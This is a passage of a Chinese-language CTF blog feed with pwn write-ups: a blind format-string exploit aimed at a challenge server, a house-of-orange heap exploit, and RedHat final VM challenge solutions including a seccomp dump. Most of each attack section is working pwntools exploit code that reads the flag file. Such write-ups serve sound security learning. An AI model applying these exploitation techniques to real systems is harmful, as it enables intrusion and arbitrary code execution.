class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">20162</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x8</span></span><br><span class="line">payload=<span class="string">'%9$s'</span>.ljust(<span class="number">8</span>,<span class="string">'a'</span>)+p64(addr)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:'</span>)</span><br><span class="line">printf_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"sprintf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"sprintf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment">#system=0x666666666666</span></span><br><span class="line">printf=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x38</span><span class="number">-8</span></span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)+<span class="string">'c%12$hn'</span>+<span class="string">'%'</span>+str(((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)<span class="number">-0x9</span>)+<span class="string">'c%13$hn'</span></span><br><span class="line">payload+=(<span class="number">32</span>-len(payload))*<span class="string">'a'</span>+p64(printf)+p64(printf+<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">';cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x03-heap">0x03 heap</span></h2><h3><span id="introduction">introduction</span></h3><p>介绍很简单，就是一个堆，给了二进制文件,给了libc2.23。</p><h3><span id="exploit">exploit</span></h3><p>分析它的伪代码，发现有一个off-by-null，并且最开始有一个格式化字符串漏洞。但是限制开辟堆块大小，必须为0x80以上的堆块。然后这一题有两种解法，一种是house of orange,还有一种就是unlink。unlink比较简单。说一下unlink的思路吧，最初泄露出pie，然后就是常规unlink。下面是我用house of orange做的。最初泄露__libc_start_main，然后确定libc基址。然后利用house of orange,造成堆块重叠，最后构造fake_file，然后getshell。</p><p>下面是我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn1"</span>)</span><br><span class="line"><span class="comment">#p=remote('47.108.135.45',20162)</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,index,content)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the index you want to create (0-10):'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Enter a size:\n"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter your name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'%15$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello, 0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-240</span></span><br><span class="line">libc_base=libc_start_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">1</span>,<span class="string">'c'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">2</span>,<span class="string">'b'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="number">3</span>,<span class="string">'c'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x100</span>+p64(<span class="number">0x210</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake_file)</span><br><span class="line">create(<span class="number">0x1e0</span>,<span class="number">4</span>,<span class="string">'cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;summary&quot;&gt;summary&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两道格式化字符串的，一道rop的盲打。rop那道是真的没什么思路，还有一道路由器的pwn,我
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="盲打pwn" scheme="http://Whali3n51.top/tags/%E7%9B%B2%E6%89%93pwn/"/>
    
      <category term="格式化字符串" scheme="http://Whali3n51.top/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>ReaHat_final_pwn</title>
    <link href="http://whali3n51.top/2019/11/28/RedHat/"/>
    <id>http://whali3n51.top/2019/11/28/RedHat/</id>
    <published>2019-11-28T15:30:00.000Z</published>
    <updated>2020-12-13T10:45:13.487Z</updated>
    
    <content type="html"><![CDATA[<p>最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在是做不出来，就不写了。</p><h2><span id="0x01粤湾中心">0x01粤湾中心</span></h2><p>这一道题比赛现场没时间做，我的逆向太菜了，当时只看懂了一个大概。赛后也想向其他师傅请教了一下。</p><p>首先拿到这道题看一下开启的保护</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>这一道题不能直接getshell，因为开启了prctl,禁用了execve</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000024</span>  A = count &gt;&gt; <span class="number">32</span> # write(fd, buf, count)</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = count # write(fd, buf, count)</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  <span class="keyword">if</span> (A == <span class="number">0x10</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这一道题最初打flag文件，然后将fd重定位到了0x233这个地方。所以我们解这一道题的主要思路就是将fileno的值改为0x233，然后当程序读取输入的时候，自动去0x233这个地方读取输入，然后再将输入打印出来，刚好本题结尾处就有这样的条件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Could you tell me your name?"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%99s"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Goodbye~ %s\n"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"See you next time."</span>);</span><br></pre></td></tr></table></figure><p>所以我们现在只需要将fileno该为0x233就可以了。</p><p>这一题提供了加减乘除等等指令。这个题的漏洞就是在读取寄存器的时候，没有对索引值进行检查，导致了越界读写。因此将栈地址改为fileno的地址，通过入栈操作就可以将该题fileno修改了。不过计算起来贼麻烦，我没有自己算，哈哈哈哈哈哈哈 ，贴一下其他师傅的脚本吧。</p><p>下面脚本是ditto师傅的，他的博客链接：<a href="http://dittozzz.top/" target="_blank" rel="noopener">http://dittozzz.top/</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./RHVM.bin"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line"><span class="comment">#context.terminal=["tmux","splitw","-h"]</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    set $reg = ($text_base+0x0000000000203060)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000001B15)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(op,idx1,idx2)</span>:</span></span><br><span class="line">    p = (op&lt;&lt;<span class="number">16</span>) | (idx1&lt;&lt;<span class="number">8</span>) | idx2 </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(len)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"EIP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ESP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Give me code length: \n"</span>,str(len))</span><br><span class="line">    a.recvuntil(<span class="string">"Give me code: \n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span><span class="params">(idx1,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,idx1,value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovDataToReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x42</span>,idx1,idx2)<span class="comment">#reg[reg[idx1]] = data[reg[idx2]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovRegToData</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x41</span>,idx1,idx2)<span class="comment">#data[reg[idx1]] = reg[idx2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xa0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftShift</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xe0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PushReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PopReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MulReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xc0</span>,idx1,idx2)</span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),<span class="comment"># reg[1] = 12</span></span><br><span class="line">    Read(<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = 0-8=-4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = -16</span></span><br><span class="line">    Read(<span class="number">3</span>,<span class="number">4</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>),<span class="comment"># reg[4] = data[-16]</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -15</span></span><br><span class="line">    AddReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 5</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>), <span class="comment"># get stderr addr</span></span><br><span class="line">    Read(<span class="number">6</span>,<span class="number">5</span>),<span class="comment">#reg[6] = 5</span></span><br><span class="line">    Read(<span class="number">7</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">2</span>),<span class="comment">#reg[7]= 9</span></span><br><span class="line">    LeftShift(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">5</span>),</span><br><span class="line">    LeftShift(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">6</span>),<span class="comment"># ==&gt; stdin.fileno</span></span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">3</span>),<span class="comment"># ==&gt; stdin.fileno-4</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment">#reg[0] = -15+8 = -7</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -8</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -9</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">5</span>),</span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -10</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">    MulReg(<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">7</span>),</span><br><span class="line">    PushReg(<span class="number">1</span>)<span class="comment"># fileno ==&gt; 0x233</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">Init(len(payload))</span><br><span class="line">debug()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a.sendline(str(i))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-粤湾银行">0x02 粤湾银行</span></h2><p>这是一道32位的pwn,比赛的时候没逆清楚，赛后复现出来了。</p><p>开启保护：</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>该题的结构体</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>Vminfo          struc ; (sizeof=<span class="number">0</span>x2C)</span><br><span class="line"><span class="symbol">00000000 </span>reg             dd <span class="number">6</span> dup(?)</span><br><span class="line"><span class="symbol">00000018 </span>_ESP            dd ?</span><br><span class="line"><span class="number">0000001</span>C _EBP            dd ?</span><br><span class="line"><span class="symbol">00000020 </span>_EIP            dd ?</span><br><span class="line"><span class="symbol">00000024 </span>field_24        dd ?</span><br><span class="line"><span class="symbol">00000028 </span>stack_ptr       dd ?</span><br><span class="line"><span class="number">0000002</span>C Vminfo          ends</span><br></pre></td></tr></table></figure><p>这一题用到了三个指令。这一题有三个指令可以达到任意地址读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span><span class="comment">#将立即数放到任意寄存器</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span><span class="comment">#打印出reg[3]地址上的一个字节</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span><span class="comment">#写一个字节到reg[3]存放的地址上</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span><span class="comment">#将任意寄存器的值加一</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br></pre></td></tr></table></figure><p>通过上面四条指令可以达到任意地址的读写</p><p>我的思路是首先将got表泄露出来，然后劫持free的got表，从而达到getshell</p><p>当然，VM是很灵活的解题，解题思路不止一种，因为我只用到了他为数不多的几个指令，还有其他完全不同的思路解题。这就是我喜欢VM的原因，全靠自己逆向，自己的自由度很高，这一题还有一种思路就是通过寄存器的越界读写，修改存放栈的地址，改为got表，也能达到劫持got表的目的，这个想法应该是可行的，就和第一道题的思路类似。</p><p>我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span 